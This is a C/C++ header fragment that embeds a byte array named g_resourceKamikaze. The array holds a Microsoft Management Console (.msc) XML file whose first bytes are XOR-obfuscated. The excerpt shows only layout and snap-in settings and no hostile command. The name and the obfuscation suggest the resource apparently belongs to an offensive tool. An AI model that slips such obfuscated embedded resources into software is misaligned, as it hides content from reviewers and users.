	0x90, 0x37, 0x00, 0x00, 0x68, 0x4A, 0x00, 0x00, 0x90, 0x37, 0x00, 0x00, 0xFD, 0x3D, 0x00, 0x00,
	0x78, 0x4A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
#endif

static const unsigned char g_resourceKamikaze[66598] = {
	0x97, 0x94, 0xD3, 0xC6, 0xC7, 0x8B, 0xDD, 0xCE, 0xD9, 0xD8, 0xC2, 0xC4, 0xC5, 0x96, 0x89, 0x9A,
	0x85, 0x9B, 0x89, 0x94, 0x95, 0x97, 0xE6, 0xE6, 0xE8, 0xF4, 0xE8, 0xC4, 0xC5, 0xD8, 0xC4, 0xC7,
	0xCE, 0xED, 0xC2, 0xC7, 0xCE, 0x8B, 0xE8, 0xC4, 0xC5, 0xD8, 0xC4, 0xC7, 0xCE, 0xFD, 0xCE, 0xD9,
	0xD8, 0xC2, 0xC4, 0xC5, 0x96, 0x89, 0x98, 0x85, 0x9B, 0x89, 0x8B, 0xFB, 0xD9, 0xC4, 0xCC, 0xD9,
	0xCA, 0xC6, 0xE6, 0xC4, 0xCF, 0xCE, 0x96, 0x89, 0xEA, 0xDE, 0xDF, 0xC3, 0xC4, 0xD9, 0x89, 0x95,
	0xA6, 0xA1, 0x8B, 0x8B, 0x97, 0xE8, 0xC4, 0xC5, 0xD8, 0xC4, 0xC7, 0xCE, 0xED, 0xC2, 0xC7, 0xCE,
	0xE2, 0xEF, 0x95, 0xD0, 0x44, 0x30, 0x39, 0x31, 0x38, 0x46, 0x42, 0x32, 0x2D, 0x46, 0x44, 0x46,
	0x35, 0x2D, 0x34, 0x41, 0x32, 0x31, 0x2D, 0x41, 0x33, 0x32, 0x33, 0x2D, 0x33, 0x32, 0x44, 0x43,
	0x37, 0x46, 0x34, 0x44, 0x36, 0x37, 0x46, 0x45, 0x7D, 0x3C, 0x2F, 0x43, 0x6F, 0x6E, 0x73, 0x6F,
	0x6C, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x49, 0x44, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x46, 0x72,
	0x61, 0x6D, 0x65, 0x53, 0x74, 0x61, 0x74, 0x65, 0x20, 0x53, 0x68, 0x6F, 0x77, 0x53, 0x74, 0x61,
	0x74, 0x75, 0x73, 0x42, 0x61, 0x72, 0x3D, 0x22, 0x74, 0x72, 0x75, 0x65, 0x22, 0x3E, 0x0D, 0x0A,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x50, 0x6C, 0x61, 0x63, 0x65,
	0x6D, 0x65, 0x6E, 0x74, 0x20, 0x53, 0x68, 0x6F, 0x77, 0x43, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64,
	0x3D, 0x22, 0x53, 0x57, 0x5F, 0x53, 0x48, 0x4F, 0x57, 0x4E, 0x4F, 0x52, 0x4D, 0x41, 0x4C, 0x22,
	0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x50, 0x6F, 0x69, 0x6E, 0x74, 0x20,
	0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4D, 0x69, 0x6E, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F,
	0x6E, 0x22, 0x20, 0x58, 0x3D, 0x22, 0x2D, 0x31, 0x22, 0x20, 0x59, 0x3D, 0x22, 0x2D, 0x31, 0x22,
	0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x50, 0x6F, 0x69, 0x6E, 0x74,
	0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4D, 0x61, 0x78, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69,
	0x6F, 0x6E, 0x22, 0x20, 0x58, 0x3D, 0x22, 0x2D, 0x31, 0x22, 0x20, 0x59, 0x3D, 0x22, 0x2D, 0x31,
	0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x52, 0x65, 0x63, 0x74,
	0x61, 0x6E, 0x67, 0x6C, 0x65, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4E, 0x6F, 0x72, 0x6D,
	0x61, 0x6C, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x22, 0x20, 0x54, 0x6F, 0x70, 0x3D,
	0x22, 0x31, 0x38, 0x30, 0x22, 0x20, 0x42, 0x6F, 0x74, 0x74, 0x6F, 0x6D, 0x3D, 0x22, 0x39, 0x33,
	0x39, 0x22, 0x20, 0x4C, 0x65, 0x66, 0x74, 0x3D, 0x22, 0x31, 0x30, 0x35, 0x22, 0x20, 0x52, 0x69,
	0x67, 0x68, 0x74, 0x3D, 0x22, 0x31, 0x35, 0x34, 0x35, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x2F, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x50, 0x6C, 0x61, 0x63, 0x65, 0x6D,
	0x65, 0x6E, 0x74, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x46, 0x72, 0x61, 0x6D, 0x65, 0x53,
	0x74, 0x61, 0x74, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x56, 0x69, 0x65, 0x77, 0x73, 0x3E,
	0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x56, 0x69, 0x65, 0x77, 0x20, 0x49, 0x44, 0x3D, 0x22,
	0x31, 0x22, 0x20, 0x53, 0x63, 0x6F, 0x70, 0x65, 0x50, 0x61, 0x6E, 0x65, 0x57, 0x69, 0x64, 0x74,
	0x68, 0x3D, 0x22, 0x32, 0x39, 0x32, 0x22, 0x20, 0x41, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x50,
	0x61, 0x6E, 0x65, 0x57, 0x69, 0x64, 0x74, 0x68, 0x3D, 0x22, 0x2D, 0x31, 0x22, 0x3E, 0x0D, 0x0A,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x42, 0x6F, 0x6F, 0x6B, 0x4D, 0x61, 0x72, 0x6B, 0x20,
	0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x52, 0x6F, 0x6F, 0x74, 0x4E, 0x6F, 0x64, 0x65, 0x22, 0x20,
	0x4E, 0x6F, 0x64, 0x65, 0x49, 0x44, 0x3D, 0x22, 0x31, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x42, 0x6F, 0x6F, 0x6B, 0x4D, 0x61, 0x72, 0x6B, 0x20, 0x4E, 0x61,
	0x6D, 0x65, 0x3D, 0x22, 0x53, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x65, 0x64, 0x4E, 0x6F, 0x64, 0x65,
	0x22, 0x20, 0x4E, 0x6F, 0x64, 0x65, 0x49, 0x44, 0x3D, 0x22, 0x32, 0x22, 0x2F, 0x3E, 0x0D, 0x0A,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x50, 0x6C, 0x61,
	0x63, 0x65, 0x6D, 0x65, 0x6E, 0x74, 0x20, 0x57, 0x50, 0x46, 0x5F, 0x52, 0x45, 0x53, 0x54, 0x4F,
	0x52, 0x45, 0x54, 0x4F, 0x4D, 0x41, 0x58, 0x49, 0x4D, 0x49, 0x5A, 0x45, 0x44, 0x3D, 0x22, 0x74,
	0x72, 0x75, 0x65, 0x22, 0x20, 0x53, 0x68, 0x6F, 0x77, 0x43, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64,
	0x3D, 0x22, 0x53, 0x57, 0x5F, 0x53, 0x48, 0x4F, 0x57, 0x4D, 0x41, 0x58, 0x49, 0x4D, 0x49, 0x5A,
	0x45, 0x44, 0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x50,
	0x6F, 0x69, 0x6E, 0x74, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4D, 0x69, 0x6E, 0x50, 0x6F,
	0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x22, 0x20, 0x58, 0x3D, 0x22, 0x2D, 0x31, 0x22, 0x20, 0x59,
	0x3D, 0x22, 0x2D, 0x31, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x3C, 0x50, 0x6F, 0x69, 0x6E, 0x74, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4D, 0x61,
	0x78, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x22, 0x20, 0x58, 0x3D, 0x22, 0x2D, 0x38,
	0x22, 0x20, 0x59, 0x3D, 0x22, 0x2D, 0x33, 0x31, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x52, 0x65, 0x63, 0x74, 0x61, 0x6E, 0x67, 0x6C, 0x65, 0x20,
	0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4E, 0x6F, 0x72, 0x6D, 0x61, 0x6C, 0x50, 0x6F, 0x73, 0x69,
	0x74, 0x69, 0x6F, 0x6E, 0x22, 0x20, 0x54, 0x6F, 0x70, 0x3D, 0x22, 0x30, 0x22, 0x20, 0x42, 0x6F,
	0x74, 0x74, 0x6F, 0x6D, 0x3D, 0x22, 0x34, 0x33, 0x36, 0x22, 0x20, 0x4C, 0x65, 0x66, 0x74, 0x3D,
	0x22, 0x30, 0x22, 0x20, 0x52, 0x69, 0x67, 0x68, 0x74, 0x3D, 0x22, 0x31, 0x31, 0x38, 0x36, 0x22,
	0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x57, 0x69, 0x6E, 0x64,
	0x6F, 0x77, 0x50, 0x6C, 0x61, 0x63, 0x65, 0x6D, 0x65, 0x6E, 0x74, 0x3E, 0x0D, 0x0A, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x56, 0x69, 0x65, 0x77, 0x4F, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x73,
	0x20, 0x56, 0x69, 0x65, 0x77, 0x4D, 0x6F, 0x64, 0x65, 0x3D, 0x22, 0x52, 0x65, 0x70, 0x6F, 0x72,
	0x74, 0x22, 0x20, 0x53, 0x63, 0x6F, 0x70, 0x65, 0x50, 0x61, 0x6E, 0x65, 0x56, 0x69, 0x73, 0x69,
	0x62, 0x6C, 0x65, 0x3D, 0x22, 0x74, 0x72, 0x75, 0x65, 0x22, 0x20, 0x41, 0x63, 0x74, 0x69, 0x6F,
	0x6E, 0x73, 0x50, 0x61, 0x6E, 0x65, 0x56, 0x69, 0x73, 0x69, 0x62, 0x6C, 0x65, 0x3D, 0x22, 0x74,
	0x72, 0x75, 0x65, 0x22, 0x20, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6F, 0x6E,
	0x42, 0x61, 0x72, 0x56, 0x69, 0x73, 0x69, 0x62, 0x6C, 0x65, 0x3D, 0x22, 0x66, 0x61, 0x6C, 0x73,
	0x65, 0x22, 0x20, 0x44, 0x65, 0x66, 0x61, 0x75, 0x6C, 0x74, 0x43, 0x6F, 0x6C, 0x75, 0x6D, 0x6E,
	0x30, 0x57, 0x69, 0x64, 0x74, 0x68, 0x3D, 0x22, 0x32, 0x30, 0x30, 0x22, 0x20, 0x44, 0x65, 0x66,
	0x61, 0x75, 0x6C, 0x74, 0x43, 0x6F, 0x6C, 0x75, 0x6D, 0x6E, 0x31, 0x57, 0x69, 0x64, 0x74, 0x68,
	0x3D, 0x22, 0x30, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x56, 0x69,
	0x65, 0x77, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x56, 0x69, 0x65, 0x77, 0x73, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x3C, 0x56, 0x69, 0x73, 0x75, 0x61, 0x6C, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62,
	0x75, 0x74, 0x65, 0x73, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x46, 0x61, 0x76, 0x6F, 0x72,
	0x69, 0x74, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x46, 0x61, 0x76, 0x6F,
	0x72, 0x69, 0x74, 0x65, 0x20, 0x54, 0x59, 0x50, 0x45, 0x3D, 0x22, 0x47, 0x72, 0x6F, 0x75, 0x70,
	0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x72, 0x69, 0x6E,
	0x67, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4E, 0x61, 0x6D, 0x65, 0x22, 0x20, 0x49, 0x44,
	0x3D, 0x22, 0x31, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x46,
	0x61, 0x76, 0x6F, 0x72, 0x69, 0x74, 0x65, 0x73, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x2F, 0x46, 0x61, 0x76, 0x6F, 0x72, 0x69, 0x74, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C,
	0x2F, 0x46, 0x61, 0x76, 0x6F, 0x72, 0x69, 0x74, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C,
	0x53, 0x63, 0x6F, 0x70, 0x65, 0x54, 0x72, 0x65, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x53, 0x6E, 0x61, 0x70, 0x69, 0x6E, 0x43, 0x61, 0x63, 0x68, 0x65, 0x3E, 0x0D, 0x0A, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x6E, 0x61, 0x70, 0x69, 0x6E, 0x20, 0x43, 0x4C, 0x53,
	0x49, 0x44, 0x3D, 0x22, 0x7B, 0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x43, 0x43, 0x2D, 0x30, 0x45,
	0x31, 0x37, 0x2D, 0x31, 0x31, 0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D, 0x30, 0x30, 0x43,
	0x30, 0x34, 0x46, 0x37, 0x32, 0x43, 0x37, 0x31, 0x37, 0x7D, 0x22, 0x20, 0x41, 0x6C, 0x6C, 0x45,
	0x78, 0x74, 0x65, 0x6E, 0x73, 0x69, 0x6F, 0x6E, 0x73, 0x45, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x64,
	0x3D, 0x22, 0x74, 0x72, 0x75, 0x65, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x3C, 0x53, 0x6E, 0x61, 0x70, 0x69, 0x6E, 0x20, 0x43, 0x4C, 0x53, 0x49, 0x44, 0x3D, 0x22,
	0x7B, 0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x43, 0x46, 0x2D, 0x30, 0x45, 0x31, 0x37, 0x2D, 0x31,
	0x31, 0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D, 0x30, 0x30, 0x43, 0x30, 0x34, 0x46, 0x37,
	0x32, 0x43, 0x37, 0x31, 0x37, 0x7D, 0x22, 0x20, 0x41, 0x6C, 0x6C, 0x45, 0x78, 0x74, 0x65, 0x6E,
	0x73, 0x69, 0x6F, 0x6E, 0x73, 0x45, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x64, 0x3D, 0x22, 0x74, 0x72,
	0x75, 0x65, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x53, 0x6E, 0x61,
	0x70, 0x69, 0x6E, 0x43, 0x61, 0x63, 0x68, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x4E, 0x6F, 0x64, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x4E,
	0x6F, 0x64, 0x65, 0x20, 0x49, 0x44, 0x3D, 0x22, 0x31, 0x22, 0x20, 0x49, 0x6D, 0x61, 0x67, 0x65,
	0x49, 0x64, 0x78, 0x3D, 0x22, 0x30, 0x22, 0x20, 0x43, 0x4C, 0x53, 0x49, 0x44, 0x3D, 0x22, 0x7B,
	0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x43, 0x43, 0x2D, 0x30, 0x45, 0x31, 0x37, 0x2D, 0x31, 0x31,
	0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D, 0x30, 0x30, 0x43, 0x30, 0x34, 0x46, 0x37, 0x32,
	0x43, 0x37, 0x31, 0x37, 0x7D, 0x22, 0x20, 0x50, 0x72, 0x65, 0x6C, 0x6F, 0x61, 0x64, 0x3D, 0x22,
	0x74, 0x72, 0x75, 0x65, 0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x4E, 0x6F, 0x64, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x3C, 0x4E, 0x6F, 0x64, 0x65, 0x20, 0x49, 0x44, 0x3D, 0x22, 0x32, 0x22, 0x20,
	0x49, 0x6D, 0x61, 0x67, 0x65, 0x49, 0x64, 0x78, 0x3D, 0x22, 0x30, 0x22, 0x20, 0x43, 0x4C, 0x53,
	0x49, 0x44, 0x3D, 0x22, 0x7B, 0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x43, 0x46, 0x2D, 0x30, 0x45,
	0x31, 0x37, 0x2D, 0x31, 0x31, 0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D, 0x30, 0x30, 0x43,
	0x30, 0x34, 0x46, 0x37, 0x32, 0x43, 0x37, 0x31, 0x37, 0x7D, 0x22, 0x20, 0x50, 0x72, 0x65, 0x6C,
	0x6F, 0x61, 0x64, 0x3D, 0x22, 0x74, 0x72, 0x75, 0x65, 0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x4E, 0x6F, 0x64, 0x65, 0x73, 0x2F,
	0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4E, 0x61, 0x6D,
	0x65, 0x22, 0x20, 0x49, 0x44, 0x3D, 0x22, 0x32, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x42, 0x69, 0x74, 0x6D, 0x61, 0x70,
	0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x44, 0x61, 0x74, 0x61, 0x20, 0x4E, 0x61,
	0x6D, 0x65, 0x3D, 0x22, 0x53, 0x6D, 0x61, 0x6C, 0x6C, 0x22, 0x20, 0x42, 0x69, 0x6E, 0x61, 0x72,
	0x79, 0x52, 0x65, 0x66, 0x49, 0x6E, 0x64, 0x65, 0x78, 0x3D, 0x22, 0x30, 0x22, 0x2F, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x44, 0x61, 0x74, 0x61, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D,
	0x22, 0x4C, 0x61, 0x72, 0x67, 0x65, 0x22, 0x20, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x52, 0x65,
	0x66, 0x49, 0x6E, 0x64, 0x65, 0x78, 0x3D, 0x22, 0x31, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x42, 0x69, 0x74, 0x6D,
	0x61, 0x70, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x44, 0x61, 0x74, 0x61,
	0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x44, 0x61, 0x74, 0x61,
	0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x3C, 0x47, 0x55, 0x49, 0x44, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x53,
	0x6E, 0x61, 0x70, 0x69, 0x6E, 0x22, 0x3E, 0x7B, 0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x43, 0x46,
	0x2D, 0x30, 0x45, 0x31, 0x37, 0x2D, 0x31, 0x31, 0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D,
	0x30, 0x30, 0x43, 0x30, 0x34, 0x46, 0x37, 0x32, 0x43, 0x37, 0x31, 0x37, 0x7D, 0x3C, 0x2F, 0x47,
	0x55, 0x49, 0x44, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x20, 0x42, 0x69,
	0x6E, 0x61, 0x72, 0x79, 0x52, 0x65, 0x66, 0x49, 0x6E, 0x64, 0x65, 0x78, 0x3D, 0x22, 0x32, 0x22,
	0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x2F, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x44, 0x61, 0x74,
	0x61, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x2F, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x44, 0x61, 0x74, 0x61, 0x73,
	0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x43, 0x6F, 0x6D, 0x70,
	0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x20, 0x56, 0x69, 0x65, 0x77, 0x49, 0x44, 0x3D, 0x22, 0x31, 0x22,
	0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x3C, 0x47, 0x55, 0x49, 0x44, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x53,
	0x6E, 0x61, 0x70, 0x69, 0x6E, 0x22, 0x3E, 0x7B, 0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x43, 0x46,
	0x2D, 0x30, 0x45, 0x31, 0x37, 0x2D, 0x31, 0x31, 0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D,
	0x30, 0x30, 0x43, 0x30, 0x34, 0x46, 0x37, 0x32, 0x43, 0x37, 0x31, 0x37, 0x7D, 0x3C, 0x2F, 0x47,
	0x55, 0x49, 0x44, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x6F, 0x72, 0x61, 0x67, 0x65, 0x20, 0x42,
	0x69, 0x6E, 0x61, 0x72, 0x79, 0x52, 0x65, 0x66, 0x49, 0x6E, 0x64, 0x65, 0x78, 0x3D, 0x22, 0x33,
	0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x3C, 0x2F, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x43,
	0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x4E, 0x6F, 0x64, 0x65, 0x3E, 0x0D, 0x0A, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x4E, 0x6F, 0x64, 0x65, 0x73, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67,
	0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4E, 0x61, 0x6D, 0x65, 0x22, 0x20, 0x49, 0x44, 0x3D,
	0x22, 0x34, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x42, 0x69, 0x74, 0x6D, 0x61, 0x70, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x44, 0x61, 0x74, 0x61, 0x20,
	0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x53, 0x6D, 0x61, 0x6C, 0x6C, 0x22, 0x20, 0x42, 0x69, 0x6E,
	0x61, 0x72, 0x79, 0x52, 0x65, 0x66, 0x49, 0x6E, 0x64, 0x65, 0x78, 0x3D, 0x22, 0x34, 0x22, 0x2F,
	0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x42, 0x69,
	0x6E, 0x61, 0x72, 0x79, 0x44, 0x61, 0x74, 0x61, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4C,
	0x61, 0x72, 0x67, 0x65, 0x22, 0x20, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x52, 0x65, 0x66, 0x49,
	0x6E, 0x64, 0x65, 0x78, 0x3D, 0x22, 0x35, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x42, 0x69, 0x74, 0x6D, 0x61, 0x70, 0x73, 0x3E, 0x0D, 0x0A,
